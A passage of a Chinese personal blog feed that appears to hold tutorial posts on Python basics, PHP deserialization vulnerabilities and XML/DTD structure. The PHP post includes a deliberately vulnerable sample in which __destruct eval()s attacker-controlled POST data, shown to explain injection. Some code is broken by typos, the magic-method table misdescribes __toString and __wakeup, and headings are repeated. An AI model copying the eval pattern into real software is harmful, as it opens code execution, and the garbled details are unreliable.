class="line"></span><br><span class="line"></span><br><span class="line">* 同一行多条语句</span><br><span class="line"></span><br><span class="line">Python可以在同一行使用多条语句，语句之间用 ; 分隔</span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line"><span class="comment">#实例</span></span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果(脚本)</span></span><br><span class="line">runoob</span><br><span class="line"><span class="comment">#运行结果(交互式命令)</span></span><br><span class="line">runoob</span><br><span class="line"><span class="number">7</span>(字符数)</span><br></pre></td></tr></table></figure><ul><li>空行</li></ul><p>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</p><p>空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。</p><blockquote><p>空行也是程序代码的一部分</p></blockquote><h4 id="6">6. import和from...import </h4><p>在 python 用 <code>import</code>或者 <code>from...import</code> 来导入相应的模块。</p><p>将整个模块(somemodule)导入，格式为： <code>import somemodule</code></p><p>从某个模块中导入某个函数,格式为： <code>from somemodule import somefunction</code></p><p>从某个模块中导入多个函数,格式为： <code>from somemodule import firstfunc, secondfunc, thirdfunc</code></p><p>将某个模块中的全部函数导入，格式为： <code>from somemodule import </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入sys模块</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;=============Python import mode===========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;命令行参数：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n python 路径为&#x27;</span>,sys.path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#导入sys模块的argv,path成员</span></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> agrv,path</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;============Python from import============&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;path&#x27;</span>,path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h4 <span class="built_in">id</span>=<span class="string">&quot;7&quot;</span>&gt; <span class="number">7.</span> 简易输入输出 &lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">* 等待用户输入</span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;\n\n按下回车后退出&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>print输出</li></ul><p>print默认输出式换行的，如果要实现不换行需要在变量末尾加上<code>end=&quot;&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;a&quot;</span></span><br><span class="line">y = <span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment">#换行输出</span></span><br><span class="line"><span class="built_in">print</span> (x)</span><br><span class="line"><span class="built_in">print</span> (y)  </span><br><span class="line"><span class="comment">#不换行输出</span></span><br><span class="line"><span class="built_in">print</span> (x, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (x, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">a b</span><br></pre></td></tr></table></figure><h4 id="8"> 8. 变量类型 </h4><ul><li>变量的赋值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python使用=作为赋值运算符</span></span><br><span class="line">name = value</span><br><span class="line">name表示变量名，value表示值，也就是要保存的数据</span><br><span class="line"></span><br><span class="line"><span class="comment">#变量不是一成不变的，它可以随时被覆盖，只要将前边的重新赋值即可，变量只能容纳一个值</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">n = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#变量可以赋值单个数据，也可以将表达式的运行结果赋值给变量</span></span><br></pre></td></tr></table></figure><ul><li>Python是弱类型语言</li></ul><p>在强类型编程语言中，定义变量时要指明变量的类型，而且赋值的数据也必须是相同的，C++，C，java都是强类型编程语言</p><p>在弱类型语言中，变量无需声明就可直接赋值，变量的数据类型可以随时改变，Python，javascript，php等脚本语言一般都是弱类型的</p><ul><li>多变量赋值</li></ul><p>python允许你同时为多个变量赋值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个整型对象，值为1，从后往前赋值，三个变量被赋予相同的数值</span></span><br><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#同时为多个对象指定多个变量,各自分配</span></span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;runoob&quot;</span></span><br></pre></td></tr></table></figure><ul><li>标准数据类型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Number<span class="comment">#数字</span></span><br><span class="line">String<span class="comment">#字符串</span></span><br><span class="line"><span class="type">List</span><span class="comment">#列表，且以上为不可变数据</span></span><br><span class="line"><span class="type">Tuple</span><span class="comment">#元组</span></span><br><span class="line"><span class="type">Set</span><span class="comment">#集合</span></span><br><span class="line">Dictionary<span class="comment">#字典，且以上为可变数据</span></span><br></pre></td></tr></table></figure><ul><li>数字类型</li></ul><p>python中数字总共有四种类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int<span class="comment">#整数型，只有一种整数型int，表示为长整型，无pyton2中的Long</span></span><br><span class="line">bool<span class="comment">#布尔型，如true flase</span></span><br><span class="line"><span class="built_in">float</span><span class="comment">#浮点型，如1.23、3e-2</span></span><br><span class="line">complex<span class="comment">#复数，如1+2j</span></span><br></pre></td></tr></table></figure><p>如同大多数语言一样，数值型的赋值和计算都是很直观的，python内置的<code>type()</code>函数可以用来查询变量所指的对象类型。此外也可以用<code>isinstance</code>来判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#type()函数判断</span></span><br><span class="line">a, b, c, d = <span class="number">20</span>, <span class="number">5.5</span>, Ture, <span class="number">4</span>+<span class="number">3j</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a), <span class="built_in">type</span>(b), <span class="built_in">type</span>(c), <span class="built_in">type</span>(d))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">int</span>&#x27;&gt; &lt;<span class="title">class</span> &#x27;<span class="title">float</span>&#x27;&gt; &lt;<span class="title">class</span> &#x27;<span class="title">bool</span>&#x27;&gt; &lt;<span class="title">class</span> &#x27;<span class="title">complex</span>&#x27;&gt;#结果</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#<span class="title">isinstance</span>判断</span></span><br><span class="line"><span class="class"><span class="title">a</span> = 111</span></span><br><span class="line"><span class="class"><span class="title">isinstance</span>(<span class="params">a, <span class="built_in">int</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">Ture</span>#结果</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#<span class="title">type</span>()不会认为子类是父类的一种类型，不考虑继承关系</span></span><br><span class="line"><span class="class">#<span class="title">isinstance</span>()会认为子类是一种父类类型，考虑继承关系</span></span><br></pre></td></tr></table></figure><p>在python3中，bool是int的字类，True和False可以和数字相加 <code>True==1</code>,<code>False==0</code>是会返回Ture，但是可以通过<code>is</code>来判断类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">issubclass</span>(<span class="built_in">bool</span>, <span class="built_in">int</span>)</span><br><span class="line"><span class="literal">True</span> = <span class="number">1</span></span><br><span class="line">Flase + <span class="number">1</span> = <span class="number">1</span><span class="comment">#以上为True</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> <span class="literal">True</span><span class="comment">#Flase</span></span><br></pre></td></tr></table></figure><p>当你指定一个值时，Number对象就会被创建</p><p>同时也可以使用del语句删除一些对象的引用</p><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt; Python入门到入门 &lt;/h2&gt;

&lt;h4&gt;目录&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;#1&quot;&gt;什么是python&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#2&quot;&gt;编码&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#3&quot;&gt;注释&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#4&quot;</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="文本语言" scheme="https://sinevil.github.io/tags/%E6%96%87%E6%9C%AC%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞(停制)</title>
    <link href="https://sinevil.github.io/2021/07/27/fanxuhua/"/>
    <id>https://sinevil.github.io/2021/07/27/fanxuhua/</id>
    <published>2021-07-27T01:21:18.000Z</published>
    <updated>2021-08-03T07:34:52.641Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PHP的类和对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">classs person&#123;</span><br><span class="line"><span class="comment">//定义类属性(类似变量),public 代表可见性(共有)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;joke&#x27;</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name.<span class="string">&quot; is smile...\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$psycho</span> = <span class="keyword">new</span> person();<span class="comment">//根据person类实例化对象</span></span><br><span class="line"><span class="variable">$psycho</span>-&gt;smile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#定义了一个person类，在类中定义了一个public类型的变量$name和类的方法smile，然后实例化一个对象$psycho，去调用person类里面的smile方法</span></span><br></pre></td></tr></table></figure><p>​    <strong>魔术方法</strong></p><table><thead><tr><th align="center">方法名</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">__construct</td><td align="center">构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td></tr><tr><td align="center">__destruct</td><td align="center">析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td align="center">__toString</td><td align="center">使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td align="center">__wakeup()</td><td align="center">使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td align="center">__sleep()</td><td align="center">使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td align="center">__destruct()</td><td align="center">对象被销毁时触发</td></tr><tr><td align="center">__call()</td><td align="center">在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td align="center">__callStatic()</td><td align="center">在静态上下文中调用不可访问的方法时触发</td></tr><tr><td align="center">__get()</td><td align="center">读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td align="center">__set()</td><td align="center">在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td align="center">__isset()</td><td align="center">当对不可访问属性调用isset()或empty()时触发</td></tr><tr><td align="center">__unset()</td><td align="center">当对不可访问属性调用unset()时触发</td></tr><tr><td align="center">__invoke()</td><td align="center">当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><blockquote><p>具体描述可见<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP手册</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;wuyifan&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; is wuqian...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//construct,destruct,toString类似</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__wakeup()方法&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__set()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__get()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jl</span> = <span class="keyword">new</span> animal();<span class="comment">#调用了__construct()方法  创建对象的时候用</span></span><br><span class="line"><span class="variable">$jl</span>-&gt;name = <span class="number">1</span>;<span class="comment">#调用了__set()方法私有属性赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jl</span>-&gt;name;<span class="comment">#调用了__get()方法私有属性赋值</span></span><br><span class="line"><span class="variable">$esr_jl</span> = serialize(<span class="variable">$jl</span>);</span><br><span class="line"><span class="comment">//print_r($ser_jl);</span></span><br><span class="line">print_r(userialize(<span class="variable">$ser_jl</span>));<span class="comment">#调用了__wakeup()方法，使用反序列化函数时调用</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#调用了__destruct()方法 结束程序调用</span></span><br></pre></td></tr></table></figure><p><strong>序列化和反序列化</strong></p><p>为了有效地储存或传递数据，同时不丢失其类型和结构，经常需要利用序列化和反序列化函数对数据进行处理</p><p>序列化函数返回字符串，此字符串包含了表达值的字节流，可以储存在任何地方</p><p>反序列化函数对单一的已序列化的变量进行操作，将其转换为原来的值</p><p>这两个过程结合起来可以轻松的储存和传输数据，使程序更具维护性</p><p><strong>序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$team</span> = <span class="string">&#x27;sl&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$steam_name</span> = <span class="string">&#x27;star&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$steam_group</span> = <span class="string">&#x27;gogo&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">star</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$team_member</span> = <span class="string">&#x27;fight&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化的结果为：</p><p>对象类型:对象长度:对象名称:类中变量个数:{变量类型:长度:“名称”;类型:长度:””值”;···}</p><p>0:4:test:3:{s:4:”team”;s:2:”sl”;···}</p><blockquote><p>当变量收到不同修饰符修饰进行序列化后，序列化后的变量的长度和名称都会发生变化</p><p>public 变量$steam的长度为4，正常输出</p><p>private 会在变量$team_name前加上类的名称，并且长度会比正常的多两个字节</p><p>protected 会在变量$team_group前边加上*，并且长度会多三个字节</p></blockquote><p>序列化格式中的字母含义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a - arrayb - booleano  - common objects - stringr - referenceR - pointer reference</span><br><span class="line">d - doublei - <span class="built_in">integer</span>C  - custom objectN - null0 - classU -unicode string</span><br></pre></td></tr></table></figure><p><strong>反序列化</strong></p><p>定义一个字符出，然后用个反序列化函数unserialize进行反序列化处理，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ser</span> = <span class="string">&#x27;0:4:test:3&#123;s:4:&quot;team&quot;;s:2:&quot;sl&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span> = userialize(<span class="variable">$ser</span>);</span><br><span class="line">var_dump(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>php反序列化漏洞</strong></p><p>在反序列化过程中，其功能类似于复原了一个对象，并赋予其相应的得属性值，如果让攻击者操纵任意反序列数据，那么攻击者就可以实现任意类对象的创建，如果一些类存在自动触发得方法(魔术函数)，就有可能以此为跳板而进攻系统应用。</p><blockquote><p>漏洞成因：</p><ol><li>uniserialize()函数可控</li><li>存在魔法函数</li></ol></blockquote><p>示例一：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable">$thiss</span>-&gt;test);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;tset&#x27;</span>];</span><br><span class="line"><span class="variable">$Len</span> = strlen(<span class="variable">$test</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;0:1:\&quot;A\&quot;:&#123;s:4:\&quot;test\&quot;;s:&quot;</span>.<span class="variable">$len</span>.<span class="string">&quot;:\&quot;&quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;;\&quot;;&#125;&quot;</span>; <span class="comment">//构造序列化对象</span></span><br><span class="line"><span class="variable">$test_usner</span> = unserialize(<span class="variable">$p</span>); <span class="comment">//反序列化同时触发__destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如上代码，通过调用<code>__destruct()</code>这个析构函数，将恶意的payload注入，导致代码执行。根据上述魔术方法，当程序跑到unserialize()反序列化的时候，会触发<code>__destruct()</code>方法，同时也可以触发<code>__wakeup()</code>方法。但是如果想恶意注入payload，还需要对$test的值进行覆盖。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;PHP的类和对象&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="注入类漏洞" scheme="https://sinevil.github.io/tags/%E6%B3%A8%E5%85%A5%E7%B1%BB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XML</title>
    <link href="https://sinevil.github.io/2021/07/26/XML/"/>
    <id>https://sinevil.github.io/2021/07/26/XML/</id>
    <published>2021-07-26T08:33:08.000Z</published>
    <updated>2021-08-03T08:01:03.006Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XML</strong></p><ul><li>什么是XML</li></ul><p>XML是一种可扩展标记语言 ，用来结构化、储存以及传输信息</p><ul><li>XML的组成</li></ul><p>XML由3个部分构成，它们分别是：XML声明，文档类型定义，文档元素</p><ul><li>XML实例</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明(定义了XML的版本和编码)--&gt;</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;  </span><br><span class="line">&lt;!--文档类型定义--&gt;(DTD)</span><br><span class="line">&lt;!DOCYTPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)</span><br><span class="line">  &lt;!ELEMRNT to (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT from (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT heading (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT body (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">]&gt;  </span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;    </span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don<span class="string">&#x27;t forget the meeting&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/note&gt;</span></span><br></pre></td></tr></table></figure><ul><li>XML声明</li></ul><p>XML声明以<?开头，以?>结尾。version属性是必选的，他定义了XML的版本，encoding的属性是可选的。定义了XML进行解码所用的字符集</p><ul><li>文档类型定义</li></ul><p> 文档类型定义是用来约束一个XML文档的书写规范</p><ol><li>文档类型定义的基础语法</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li> 对文档类型定义直接放在XML文档中，称为内部定义。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCYTPE note [  <span class="comment">#定义此文档的类型</span></span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)  <span class="comment">#定义note的四个元素</span></span><br><span class="line">  &lt;!ELEMRNT to (<span class="comment">#PCDATA)&gt;  #定义元素类型</span></span><br><span class="line">  &lt;!ELEMRNT from (<span class="comment">#PCDATA)&gt;  </span></span><br><span class="line">  &lt;!ELEMRNT heading (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT body (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>外部文档引用</li></ol><p>文档类型定义的内容也可以单独保存为单独的DTD文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#DTD引用本地文档</span></span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM “文件名“&gt;</span><br><span class="line"><span class="comment">#DTD引用公共网络上的DTD</span></span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC <span class="string">&quot;DTD名称&quot;</span> <span class="string">&quot;DTD文档的URL&quot;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>DTD(文档类型定义)的作用是定义XML文档的合法构建模块，DTD可以在内部声明，也可以外部声明</p><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;XML&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是XML&lt;/li&gt;
